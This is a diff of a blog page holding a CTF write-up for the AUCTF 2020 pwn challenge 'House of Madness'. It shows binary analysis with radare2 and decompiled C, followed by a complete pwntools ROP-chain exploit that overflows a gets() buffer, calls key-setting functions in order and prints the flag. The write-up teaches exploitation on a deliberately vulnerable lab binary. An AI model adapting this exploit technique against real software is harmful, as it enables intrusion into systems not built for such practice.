@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head>
-         
+        
+
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <title>AUCTF 2020 Writeup - House of Madness</title>
@@ -39,13 +40,21 @@
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  
 
-
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-
-     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script> 
-
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/java.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/javascript.min.js"></script>
+    
     <script>hljs.initHighlightingOnLoad();</script>
-
 
 
 
@@ -59,39 +68,33 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.55.6" />
+ <meta name="generator" content="Hugo 0.72.0" />
         
 
         
 
         
+            <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
         
-        <script type="text/javascript" async
-          src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-        </script>
+
         
+
     </head>
 
     <body>
-         
+        
+
         <nav class="navbar navbar-default navbar-fixed-top">
-
             <div class="container">
-
                 <div class="navbar-header">
-
                     <a class="navbar-brand visible-xs" href="#">AUCTF 2020 Writeup - House of Madness</a>
-
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-
                 </div>
-
                 <div class="collapse navbar-collapse">
-
                     
                         <ul class="nav navbar-nav">
                             
@@ -107,7 +110,6 @@
                             
                         </ul>
                     
-
                     
                         <ul class="nav navbar-nav navbar-right">
                             
@@ -117,77 +119,51 @@
                             
                                 <li class="navbar-icon"><a href="https://instagram.com/r7florio/"><i class="fa fa-instagram"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
+                                <li class="navbar-icon"><a href="/key.asc"><i class="fa fa-key"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key"><i class="fa fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
                             
                         </ul>
                     
-
                 </div>
-
             </div>
-
         </nav>
 
 
 <main>
 
-    <div class="item">
+    <div>
+        <h2>AUCTF 2020 Writeup - House of Madness</h2>
+        <h5>April 19, 2020</h5>
+        
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
 
-    
-    
-    
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
 
-    
-    
+<a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
 
-    <h4><a href="/post/house-of-madness-auctf2020/">AUCTF 2020 Writeup - House of Madness</a></h4>
-    <h5>April 19, 2020</h5>
-    
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
 
-</div>
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
 
 
-    <br> <div class="text-justify">
+    </div>
 
-<h1 id="intro">Intro</h1>
-
+    <div align="left" class="content"><h1 id="intro">Intro</h1>
 <p>This is the third pwn challenge. It was solved 100 times and it was worth 897 points.</p>
-
 <p>Description:</p>
-
 <blockquote>
 <p>Welcome to the House of Madness. Can you pwn your way to the keys to get the relic?</p>
-
 <p>nc challenges.auctf.com 30012</p>
-
 <p>Note: ASLR is disabled for this challenge</p>
 </blockquote>
-
-<p>You could download the binary <a href="/ctf/binary/auctf2020/house_of_madness">here</a>.</p>
-
-<pre><code class="language-shell">$ sha256sum ./house_of_madness
+<p>You could download the binary <a href="/ctf/auctf2020/binary/house_of_madness">here</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sha256sum ./house_of_madness
 15b1a68ae0e1d4eee4f917cc92412d90fd3a4adbb5a55a83b115e0f438baaf93  house_of_madness
-</code></pre>
-
-<h1 id="exploitation">Exploitation</h1>
-
+</code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>When we launch the program shows a banner and it asks us to make a choice. I tried at this point, without success, a classic buffer overflow.</p>
-
 <p>However if we try to exit the program shows us the direction. Indeed there is a buffer overflow:</p>
-
-<pre><code class="language-shell">$ ./house_of_madness
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./house_of_madness
 +------------------------+
 |          Welcome       |
 |            to          |
@@ -199,251 +175,208 @@ Can you pwn the house?
 2. Enter Room
 3. Get Current Room Info
 4. Quit
-Your choice: 4
+Your choice: <span style="color:#ae81ff">4</span>
 
 
-Wait a minute. This doesn't quit the program... Weird. Hey try entering 'Stephen' in Room 4. I heard the room's magic
-
-1. List Rooms
-2. Enter Room
-3. Get Current Room Info
-4. Quit
-Your choice: 2
-
-
-Choose a room to enter: 4
+Wait a minute. This doesn<span style="color:#e6db74">&#39;t quit the program... Weird. Hey try entering &#39;</span>Stephen<span style="color:#e6db74">&#39; in Room 4. I heard the room&#39;</span>s magic
 
 1. List Rooms
 2. Enter Room
 3. Get Current Room Info
 4. Quit
-Your choice: 3
+Your choice: <span style="color:#ae81ff">2</span>
+
+
+Choose a room to enter: <span style="color:#ae81ff">4</span>
+
+1. List Rooms
+2. Enter Room
+3. Get Current Room Info
+4. Quit
+Your choice: <span style="color:#ae81ff">3</span>
 
 
 Wow this room is special. It echoes back what you say!
 Press Q to exit: Stephen
-	You entered 'Stephen'
+	You entered <span style="color:#e6db74">&#39;Stephen&#39;</span>
 Welcome to the hidden room! Good Luck
 Enter something: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Segmentation fault (core dumped)
-</code></pre>
-
-<p>So I analyzed the program with checksec and I opened it with radare2:</p>
-
-<pre><code class="language-shell">$ checksec house_of_madness
+Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</code></pre></div><p>So I analyzed the program with checksec and I opened it with radare2:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ checksec house_of_madness
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      PIE enabled
 $ r2 -Ad ./house_of_madness
-</code></pre>
-
-<p>Then I found these interesting functions:</p>
-
-<pre><code class="language-shell">[r2]&gt; afl
+</code></pre></div><p>Then I found these interesting functions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 .....
-0x56556580    8 261          sym.room4
-0x5655686b   16 360          sym.get_flag
+0x56556580    <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">261</span>          sym.room4
+0x5655686b   <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">360</span>          sym.get_flag
 .....
-</code></pre>
-
-<p>The <code>room4</code> function use <code>gets</code> if <code>Stephen</code> was given as first input. However if we try to call directly <code>get_flag</code>, exploiting the buffer overflow, we got:</p>
-
-<pre><code class="language-shell">$ ./exploit.py
-It's not going to be that easy. Come on
-</code></pre>
-
-<p>So I decompiled the <code>get_flag</code> function and it prints the flag iff four keys have the correct values:</p>
-
-<pre><code class="language-c">void get_flag(void)
+</code></pre></div><p>The <code>room4</code> function use <code>gets</code> if <code>Stephen</code> was given as first input. However if we try to call directly <code>get_flag</code>, exploiting the buffer overflow, we got:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py
+It<span style="color:#960050;background-color:#1e0010">&#39;</span>s not going to be that easy. Come on
+</code></pre></div><p>So I decompiled the <code>get_flag</code> function and it prints the flag iff four keys have the correct values:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_flag</span>(<span style="color:#66d9ef">void</span>)
 
 {
-  int iVar1;
-  char local_60 [64];
-  FILE *local_20;
-  
-  local_20 = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
-  if (local_20 == (FILE *)0x0) {
-    puts(&quot;\'flag.txt\' missing in the current directory!&quot;);
-    exit(0);
+  <span style="color:#66d9ef">int</span> iVar1;
+  <span style="color:#66d9ef">char</span> local_60 [<span style="color:#ae81ff">64</span>];
+  FILE <span style="color:#f92672">*</span>local_20;
+
+  local_20 <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+  <span style="color:#66d9ef">if</span> (local_20 <span style="color:#f92672">==</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+    puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">flag.txt</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> missing in the current directory!&#34;</span>);
+    exit(<span style="color:#ae81ff">0</span>);
   }
-  if ((((key1 != '\0') &amp;&amp; (key2 != '\0')) &amp;&amp; (iVar1 = strcmp(key3,&quot;Dormammu&quot;), iVar1 == 0)) &amp;&amp;
-     ((key4._4_4_ ^ 0x537472 | (uint)key4 ^ 0x616e6765) == 0)) {
-    fgets(local_60,0x40,local_20);
-    printf(&quot;Damn you beat the house: %s\n&quot;,local_60);
-    return;
+  <span style="color:#66d9ef">if</span> ((((key1 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (key2 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) <span style="color:#f92672">&amp;&amp;</span> (iVar1 <span style="color:#f92672">=</span> strcmp(key3,<span style="color:#e6db74">&#34;Dormammu&#34;</span>), iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">&amp;&amp;</span>
+     ((key4._4_4_ <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x537472</span> <span style="color:#f92672">|</span> (uint)key4 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x616e6765</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
+    fgets(local_60,<span style="color:#ae81ff">0x40</span>,local_20);
+    printf(<span style="color:#e6db74">&#34;Damn you beat the house: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,local_60);
+    <span style="color:#66d9ef">return</span>;
   }
-  if (((key1 != '\0') &amp;&amp; (key2 != '\0')) &amp;&amp; (iVar1 = strcmp(key3,&quot;Dormammu&quot;), iVar1 == 0)) {
-    printf(&quot;Surrender, Stephen. Surrender to the reverser&quot;);
-    return;
+  <span style="color:#66d9ef">if</span> (((key1 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (key2 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) <span style="color:#f92672">&amp;&amp;</span> (iVar1 <span style="color:#f92672">=</span> strcmp(key3,<span style="color:#e6db74">&#34;Dormammu&#34;</span>), iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
+    printf(<span style="color:#e6db74">&#34;Surrender, Stephen. Surrender to the reverser&#34;</span>);
+    <span style="color:#66d9ef">return</span>;
   }
-  if ((key1 == '\0') || (key2 == '\0')) {
-    printf(&quot;It\'s not going to be that easy. Come on&quot;);
+  <span style="color:#66d9ef">if</span> ((key1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>) <span style="color:#f92672">||</span> (key2 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) {
+    printf(<span style="color:#e6db74">&#34;It</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s not going to be that easy. Come on&#34;</span>);
   }
-  else {
-    puts(&quot;You think you are ready? You are ready when the relic decides you are ready.&quot;);
+  <span style="color:#66d9ef">else</span> {
+    puts(<span style="color:#e6db74">&#34;You think you are ready? You are ready when the relic decides you are ready.&#34;</span>);
   }
-  return;
+  <span style="color:#66d9ef">return</span>;
 }
-</code></pre>
-
-<p>So, to print the flag:</p>
-
+</code></pre></div><p>So, to print the flag:</p>
 <ul>
 <li><code>key1</code> should be different than 0</li>
 <li><code>key2</code> should be different than 0</li>
-<li><code>key3</code> should point to &ldquo;Dormammu&rdquo;</li>
+<li><code>key3</code> should point to “Dormammu”</li>
 <li><code>key4[0]</code> should be 0x616e6765</li>
 <li><code>key4[1]</code> should be 0x537472</li>
 </ul>
-
 <p>Fortunately I rapidly found three useful functions:</p>
-
 <ul>
 <li><code>get_key1</code> @ <code>0x565566de</code></li>
 <li><code>get_key2</code> @ <code>0x5655676e</code></li>
 <li><code>set_key4</code> @ <code>0x565567e9</code></li>
 </ul>
-
-<h3 id="get-key1">get_key1</h3>
-
+<h3 id="get_key1">get_key1</h3>
 <p>Iff the first function argument is <code>0xfeedc0de</code> it writes 1 in <code>key1</code>. We can use it.</p>
-
-<h3 id="get-key2">get_key2</h3>
-
-<p>It&rsquo;s a bit more complex than <code>get_key1</code>. Indeed it writes 1 in <code>key2</code>, but it should be called before <code>get_key1</code> and after that <code>key3</code> points to &ldquo;Dormammu&rdquo;.</p>
-
-<p>Given these prerequisites we can use it:</p>
-
-<pre><code class="language-c">void get_key2(void)
+<h3 id="get_key2">get_key2</h3>
+<p>It’s a bit more complex than <code>get_key1</code>. Indeed it writes 1 in <code>key2</code>, but it should be called before <code>get_key1</code> and after that <code>key3</code> points to “Dormammu”.</p>
+<p>Given these prerequisites we can use it.</p>
+<p>Here the function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_key2</span>(<span style="color:#66d9ef">void</span>)
 {
-  int iVar1;
-  
-  if ((key1 != '\x01') &amp;&amp; (iVar1 = strcmp(key3,&quot;Dormammu&quot;), iVar1 == 0)) {
-    key2 = 1;
-    return;
+  <span style="color:#66d9ef">int</span> iVar1;
+
+  <span style="color:#66d9ef">if</span> ((key1 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\x01&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (iVar1 <span style="color:#f92672">=</span> strcmp(key3,<span style="color:#e6db74">&#34;Dormammu&#34;</span>), iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
+    key2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">return</span>;
   }
-  puts(&quot;Need to get the right keys. Reverse the house harder&quot;);
-  return;
+  puts(<span style="color:#e6db74">&#34;Need to get the right keys. Reverse the house harder&#34;</span>);
+  <span style="color:#66d9ef">return</span>;
 }
-</code></pre>
-
-<h3 id="set-key4">set_key4</h3>
-
+</code></pre></div><h3 id="set_key4">set_key4</h3>
 <p>It checks all other keys, then it writes the correct values in <code>key4</code>.</p>
-
-<p>As <code>get_key2</code> if <code>key3</code> points to &ldquo;Dormammu&rdquo; we can use it:</p>
-
-<pre><code class="language-c">void set_key4(void)
+<p>As <code>get_key2</code> if <code>key3</code> points to “Dormammu” we can use it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_key4</span>(<span style="color:#66d9ef">void</span>)
 {
-  int iVar1;
+  <span style="color:#66d9ef">int</span> iVar1;
   
-  if ((((isInRoom != '\x01') &amp;&amp; (key1 != '\0')) &amp;&amp; (key2 != '\0')) &amp;&amp;
-     (iVar1 = strcmp(key3,&quot;Dormammu&quot;), iVar1 == 0)) {
-    key4._0_4_ = 0x616e6765;
-    key4._4_4_ = 0x537472;
-    return;
+  <span style="color:#66d9ef">if</span> ((((isInRoom <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\x01&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (key1 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) <span style="color:#f92672">&amp;&amp;</span> (key2 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) <span style="color:#f92672">&amp;&amp;</span>
+     (iVar1 <span style="color:#f92672">=</span> strcmp(key3,<span style="color:#e6db74">&#34;Dormammu&#34;</span>), iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
+    key4._0_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x616e6765</span>;
+    key4._4_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x537472</span>;
+    <span style="color:#66d9ef">return</span>;
   }
-  puts(&quot;Need to get the right keys. Reverse the house harder&quot;);
-  return;
+  puts(<span style="color:#e6db74">&#34;Need to get the right keys. Reverse the house harder&#34;</span>);
+  <span style="color:#66d9ef">return</span>;
 }
-</code></pre>
-
-<h3 id="key3">key3</h3>
-
-<p>We need a way to write the correct pointer in <code>key3</code>. It&rsquo;s the last piece of the puzzle.
-After some digging I found this function. I analyzed its behavior and it writes in <code>key3</code> a pointer to &ldquo;Dormammu&rdquo;:</p>
-
-<pre><code>[r2]&gt; afl
+</code></pre></div><h3 id="key3">key3</h3>
+<p>We need a way to write the correct pointer in <code>key3</code>.
+It’s the last piece of the puzzle. After some digging I found this function.
+I analyzed its behavior and it writes in <code>key3</code> a pointer to “Dormammu”:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 .....
-0x565567cd    1 28           sym.AAsDrwEk
+0x565567cd    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">28</span>           sym.AAsDrwEk
 .....
-[r2]&gt; pdf @sym.AAsDrwEk
-┌ 28: sym.AAsDrwEk ();
-│           0x565567cd      55             push ebp
+<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.AAsDrwEk
+┌ 28: sym.AAsDrwEk <span style="color:#f92672">()</span>;
+│           0x565567cd      <span style="color:#ae81ff">55</span>             push ebp
 │           0x565567ce      89e5           mov ebp, esp
 │           0x565567d0      e848020000     call sym.__x86.get_pc_thunk.ax
 │           0x565567d5      052b280000     add eax, 0x282b
-│           0x565567da      8d9015e4ffff   lea edx, [eax - 0x1beb]
-│           0x565567e0      899040000000   mov dword [eax + 0x40], edx
-│           0x565567e6      90             nop
+│           0x565567da      8d9015e4ffff   lea edx, <span style="color:#f92672">[</span>eax - 0x1beb<span style="color:#f92672">]</span>
+│           0x565567e0      <span style="color:#ae81ff">899040000000</span>   mov dword <span style="color:#f92672">[</span>eax + 0x40<span style="color:#f92672">]</span>, edx
+│           0x565567e6      <span style="color:#ae81ff">90</span>             nop
 │           0x565567e7      5d             pop ebp
 └           0x565567e8      c3             ret
-[r2]&gt; ps @0x565567d5 + 0x282b - 0x1beb
+<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; ps @0x565567d5 + 0x282b - 0x1beb
 Dormammu
-[r2]&gt; is~`?v 0x565567d5 + 0x282b + 0x40`
-96   0x00003040 0x56559040 GLOBAL OBJ    4        key3
-</code></pre>
-
-<h3 id="exploit">Exploit</h3>
-
+<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; is~<span style="color:#e6db74">`</span>?v 0x565567d5 + 0x282b + 0x40<span style="color:#e6db74">`</span>
+<span style="color:#ae81ff">96</span>   0x00003040 0x56559040 GLOBAL OBJ    <span style="color:#ae81ff">4</span>        key3
+</code></pre></div><h3 id="exploit">Exploit</h3>
 <p>So we have all the pieces in place.</p>
-
 <p>This is my exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
 
-<pre><code class="language-python">#!/usr/bin/python2
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-from pwn import *
+prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(os<span style="color:#f92672">.</span>getcwd() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/challenge&#34;</span>, checksec<span style="color:#f92672">=</span>False)
 
-prog = context.binary = ELF(os.getcwd() + &quot;/challenge&quot;, checksec=False)
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;challenges.auctf.com&#34;</span>
+        port <span style="color:#f92672">=</span> <span style="color:#ae81ff">30012</span>
+        t <span style="color:#f92672">=</span> remote(host, port)
+<span style="color:#66d9ef">else</span>:
+        t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
 
-if len(sys.argv) &gt; 1:
-        host = &quot;challenges.auctf.com&quot;
-        port = 30012
-        t = remote(host, port)
-else:
-	t = prog.process()
-
-def init():
-	t.recvuntil(&quot;Your choice: &quot;)
-        t.sendline(&quot;2&quot;)
-        t.recvuntil(&quot;Choose a room to enter: &quot;)
-        t.sendline(&quot;4&quot;)
-        t.recvuntil(&quot;Your choice: &quot;)
-        t.sendline(&quot;3&quot;)
-        t.recvuntil(&quot;Press Q to exit: &quot;)
-        t.sendline(&quot;Stephen&quot;)
-        t.recvuntil(&quot;Enter something: &quot;)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>():
+        t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your choice: &#34;</span>)
+        t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
+        t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choose a room to enter: &#34;</span>)
+        t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
+        t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your choice: &#34;</span>)
+        t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;3&#34;</span>)
+        t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Press Q to exit: &#34;</span>)
+        t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;Stephen&#34;</span>)
+        t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Enter something: &#34;</span>)
 init()
 
-base = 0x56555000
-pebx = 0x56556aaa
+base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x56555000</span>
+pebx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x56556aaa</span>
 
-offset = 28
-payload = &quot;P&quot;*offset
-payload += pack(prog.symbols[&quot;AAsDrwEk&quot;] + base)
-payload += pack(prog.symbols[&quot;get_key2&quot;] + base)
-payload += pack(prog.symbols[&quot;get_key1&quot;] + base)
-payload += pack(pebx)
-payload += pack(0xfeedc0de)
-payload += pack(prog.symbols[&quot;set_key4&quot;] + base)
-payload += pack(prog.symbols[&quot;get_flag&quot;] + base)
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;P&#34;</span><span style="color:#f92672">*</span>offset
+payload <span style="color:#f92672">+=</span> pack(prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;AAsDrwEk&#34;</span>] <span style="color:#f92672">+</span> base)
+payload <span style="color:#f92672">+=</span> pack(prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;get_key2&#34;</span>] <span style="color:#f92672">+</span> base)
+payload <span style="color:#f92672">+=</span> pack(prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;get_key1&#34;</span>] <span style="color:#f92672">+</span> base)
+payload <span style="color:#f92672">+=</span> pack(pebx)
+payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0xfeedc0de</span>)
+payload <span style="color:#f92672">+=</span> pack(prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;set_key4&#34;</span>] <span style="color:#f92672">+</span> base)
+payload <span style="color:#f92672">+=</span> pack(prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;get_flag&#34;</span>] <span style="color:#f92672">+</span> base)
 
-t.sendline(payload)
+t<span style="color:#f92672">.</span>sendline(payload)
 
-t.interactive()
-t.close()
-</code></pre>
-
-<p>And this is the flag:</p>
-
-<pre><code class="language-shell">$ ./exploit.py
+t<span style="color:#f92672">.</span>interactive()
+t<span style="color:#f92672">.</span>close()
+</code></pre></div><p>And this is the flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py
 .....
-Damn you beat the house: auctf{gu3ss_th3_h0us3_1sn't_th4t_m4d}
+Damn you beat the house: auctf<span style="color:#f92672">{</span>gu3ss_th3_h0us3_1sn<span style="color:#960050;background-color:#1e0010">&#39;</span>t_th4t_m4d<span style="color:#f92672">}</span>
 .....
-</code></pre>
-
-<p><img src="/images/auctf2020/house_of_madness/solved.png" alt="house of madness solved banner" /></p>
+</code></pre></div><p><img src="/ctf/auctf2020/images/house-of-madness-solved.png" alt="house of madness solved banner"></p>
 </div>
 
     
     
-
     
-
         <h4 class="page-header">Related</h4>
-
          <div class="item">
 
     
@@ -456,16 +389,17 @@ Damn you beat the house: auctf{gu3ss_th3_h0us3_1sn't_th4t_m4d}
     <h4><a href="/post/pick-up-that-can-auctf2020/">AUCTF 2020 Writeup - Pick Up That CAN</a></h4>
     <h5>May 1, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
